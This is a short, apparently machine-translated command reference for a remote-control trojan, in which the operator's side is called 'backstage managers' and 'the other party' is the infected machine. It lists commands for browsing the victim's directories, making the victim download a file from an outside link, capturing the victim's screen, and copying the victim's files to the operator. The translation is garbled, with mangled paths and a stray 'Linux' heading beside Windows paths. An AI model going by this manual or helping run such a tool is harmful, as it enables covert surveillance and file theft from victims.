Explanation on remote control of desire

Linux

Dir - Query directories (queries for files with specified paths) for example: dir-D:.\\

Down-Download Link-Save Path (Let the other party download the file with the specified link) -- For example, down-http://www.anyuer.club-D:\index.ph

Screen-save path (intercepting each other's screen) -- for example: screen-D:\\\ 001.jpg

Pass-to-Face Hard Disk File Path-File Path saved by yourself (let the other party file transfer to your computer) -- e.g. pass-D:\\\\\\\\\ 001.jpg-E:\\\ 2002.jpg


The above "other party" refers to the side of the virus. Self refers to backstage managers
